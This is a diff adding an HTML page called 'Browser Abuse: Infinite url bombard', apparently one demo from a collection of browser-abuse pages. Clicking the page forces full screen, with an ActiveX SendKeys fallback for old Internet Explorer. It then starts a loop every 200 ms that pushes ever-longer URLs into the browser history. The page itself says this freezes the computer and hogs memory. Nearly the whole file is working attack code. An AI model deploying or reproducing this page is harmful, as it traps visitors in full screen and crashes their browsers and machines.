@@ -1,0 +1,66 @@
+<!DOCTYPE html>
+<html>
+<head>
+<script src="http://code.jquery.com/jquery-1.9.1.js"></script>
+
+<style>
+	img {
+	    width: 100%;
+	    height: auto;
+	}
+</style>
+
+<script> 
+	function bomb_url() {
+	  var total = "";
+	  for( var i = 0; i < 100000; i++ ) {
+	    total = total + i.toString();
+	    /* The total is the url being passed */
+	    /* @param: state, title, url */
+	    history.pushState(0,0, total );
+	    /* Displaying the value in page */
+	    // document.write(total)
+	  }
+	}
+	/* Set interval calls the bomb url in every 200 ms */
+	function intervalCall() {
+	  setInterval(function(){ 
+	    bomb_url(); }, 200);
+
+	}
+
+	function requestFullScreen() {
+	  var element = document.body;
+
+	  // Supports: IE, Firefox, Safari, Chrome, Opera and most browsers
+	  // https://developer.mozilla.org/en-US/docs/Web/API/Element/requestFullScreen
+	  var request = element.requestFullScreen || element.webkitRequestFullScreen || element.mozRequestFullScreen || element.msRequestFullScreen;
+
+	  if (request) { // Native full screen 
+	    request.call(element);
+	  } else if (typeof window.ActiveXObject !== "undefined") { // Older IE
+	    var wscript = new ActiveXObject("WScript.Shell");
+
+	    if (wscript !== null) {
+	      wscript.SendKeys("{F11}");
+	    }
+	  }
+	  intervalCall();
+	}
+
+</script>
+</head>
+
+<body>
+
+<div onclick="alert('You clicked me !')">
+	<Strong>Browser Abuse: Infinite url bombard </Strong>
+	<p> In this browser abuse, user clicks button or any part of the page, the page goes to full screen mode. </p>
+	<p> When user tries to get out of full screen mode, the infinite url freezes computer and creates memory hog </p>
+	<p> <Strong> Technique used:</Strong> Set interval with small timeframe less than a second, and history replace with long random digits or characters </p>
+	<input id="clickbutton" type="button" value="Click me" onclick="requestFullScreen()" /> <br /> <br /> <br /> 
+	<img src="infinity.png" onclick="requestFullScreen()"/ >
+</div>
+
+</body>
+</html>
